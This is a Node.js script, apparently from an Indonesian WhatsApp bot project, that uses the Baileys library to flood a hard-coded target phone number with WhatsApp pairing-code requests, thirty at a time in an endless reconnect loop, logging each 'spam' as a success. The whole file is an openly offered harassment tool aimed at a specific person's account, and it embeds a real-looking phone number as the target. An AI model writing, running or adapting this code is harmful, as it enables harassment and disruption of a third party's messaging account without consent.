const { default: makeWASocket, useMultiFileAuthState, disconnect } = require("@whiskeysockets/baileys");
const pino = require('pino');

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m'
];
const wColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

// Set target phone number here
const phoneNumber = '6285895255205'; // Ganti dengan nomor target yang diinginkan

// Logging to file
const logger = pino({ level: "info" }, pino.destination('./spam_log.log'));

async function createSocketConnection() {
    const { state, saveCreds } = await useMultiFileAuthState('./69/session');
    const IrullBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        auth: state,
        printQRInTerminal: false,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    IrullBotInc.ev.on('creds.update', saveCreds);
    return IrullBotInc;
}

async function sendSpam(IrullBotInc, phoneNumber, IrullCodes = 30) {
    for (let i = 0; i < IrullCodes; i++) {
        try {
            let code = await IrullBotInc.requestPairingCode(phoneNumber);
            code = code?.match(/.{1,4}/g)?.join("-") || code;
            console.log(color + `Succes Spam Pairing Code - Number : ${phoneNumber} from : [${i + 1}/${IrullCodes}]` + xColor);
            logger.info(`Succes Spam - Number : ${phoneNumber} from : [${i + 1}/${IrullCodes}]`);

            // Adding a delay to prevent rate limiting or potential ban
            await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
        } catch (error) {
            console.error('Error during spam:', error.message);
            logger.error(`Error during spam: ${error.message}`);
        }
    }
}

async function IrullProject() {
    while (true) {
        try {
            const IrullBotInc = await createSocketConnection();
            console.log(color + `Mulai spam ke nomor: ${phoneNumber}` + xColor);

            // Send 30 spam pairing codes
            await sendSpam(IrullBotInc, phoneNumber);

            console.log(color + `Spam selesai. Memulai ulang...` + xColor);
            logger.info('Spam selesai, memulai ulang...');

            // Disconnect and clean up
            await IrullBotInc.end();
            await new Promise(resolve => setTimeout(resolve, 5000)); // 5 second delay before reconnecting
        } catch (error) {
            console.error('Error in main loop:', error.message);
            logger.error(`Error in main loop: ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, 10000)); // 10 second delay to try reconnecting
        }
    }
}

console.log(color + `
┏❐ 
┃ [ TUTORIAL SPAM PAIRING ]
┃
┃⭔ Nomor Target: ${phoneNumber}
┃⭔ Jumlah Spam: 30 (Fixed)
┃
┃ 
┗❐ 
===============================` + xColor);

IrullProject();
